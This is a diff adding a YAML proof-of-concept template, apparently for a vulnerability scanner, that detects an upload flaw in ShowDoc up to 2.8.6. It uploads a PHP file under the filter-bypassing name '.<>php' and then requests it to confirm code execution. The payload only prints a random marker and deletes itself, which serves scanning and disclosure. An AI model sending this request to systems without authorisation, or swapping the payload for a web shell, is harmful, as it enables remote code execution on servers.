@@ -1,0 +1,41 @@
+name: poc-yaml-showdoc-uploadfile
+manual: true
+transport: http
+set:
+    r1: randomLowercase(4)
+    r2: randomLowercase(4)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?s=/home/page/uploadImg
+            headers:
+                Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+            body: "\
+                ----------------------------835846770881083140190633\r\n\
+                Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"{{r1}}.<>php\"\r\n\
+                Content-Type: text/plain\r\n\
+                \r\n\
+                <?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n\
+                ----------------------------835846770881083140190633--\r\n\
+                "
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"success")
+        output:
+            search: '"(?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)".bsubmatch(response.body)'
+            date: search["date"]
+            file: search["file"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Public/Uploads/{{date}}/{{file}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
+detail:
+    author: White(https://github.com/WhiteHSBG)
+    links:
+        - https://github.com/star7th/showdoc/pull/1059
+    Affected Version: showdoc <= 2.8.6
